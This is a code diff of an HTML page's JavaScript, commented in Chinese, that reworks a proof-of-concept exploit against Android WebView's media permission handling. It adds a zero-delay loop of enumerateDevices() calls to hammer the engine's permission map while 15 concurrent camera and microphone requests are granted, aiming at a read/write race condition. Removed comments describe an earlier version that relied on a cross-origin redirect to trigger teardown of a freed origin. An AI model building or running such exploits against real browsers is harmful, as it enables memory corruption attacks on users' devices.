@@ -31,19 +31,40 @@
     </div>
 
     <script>
+        let isAttacking = false;
+    
+        // 1. 负责轰炸底层“读”通道的函数
+        async function startReaderBombardment() {
+            console.log("🔥 后台多媒体读线程轰炸机已启动...");
+            while (isAttacking) {
+                try {
+                    // 疯狂调用此接口，迫使底层多媒体线程高频去读取 AwPermissionManager 的全局 Map
+                    await navigator.mediaDevices.enumerateDevices();
+                } catch (e) {
+                    // 忽略异常，保持最高频冲锋
+                }
+                // 0毫秒延迟，尽可能榨干 JS 异步队列，让读请求密密麻麻地冲向内核
+                await new Promise(resolve => setTimeout(resolve, 0));
+            }
+        }
+    
         function triggerManualAttack() {
-            console.log("开始向内核队列注入 30 个并发权限请求...");
+            if (isAttacking) return;
+            isAttacking = true;
+    
+            // 💥 核心同步点 A：启动后台高频“读 Map”轰炸
+            startReaderBombardment();
+    
+            console.log("🚀 开始向内核队列注入并发权限请求（准备触发连环写 Map）...");
             
-            // 核心伏笔：一口气往内核的 PermissionRequestManager 里塞入 30 个任务
-            // 此时底层会生成 30 个 MediaAccessPermissionRequest 对象
-            for (let i = 0; i < 10; i++) {
+            // 💥 核心同步点 B：连续注入 15 个权限请求
+            // 当你点击“允许”时，Java 层会连环触发 grant()，造成主线程高频“写 Map”
+            for (let i = 0; i < 15; i++) {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                 .then((stream) => {
-                    // 核心时序：当你手动点击“允许”的瞬间，第 1 个排队成功的请求会立刻触发此回调
-                    // 并在零点几毫秒内执行跨域重定向，强行让内核对当前页面执行 Tear Down（大卸八块）
-                    // 此时，后面剩下的 29 个请求还在内核管道里排队执行 OnAccept() 流程
-                    // 它们一睁眼，正好撞上老 Origin 被释放、摄像头字符串填坑的毁灭现场！
-                    // window.location.href = "about:blank";
+                    console.log(`第 ${i} 个流获取成功`);
+                    // 成功后可以关掉流，防止占用设备
+                    stream.getTracks().forEach(track => track.stop());
                 })
                 .catch(err => {
                     console.log("请求被拒绝或取消");
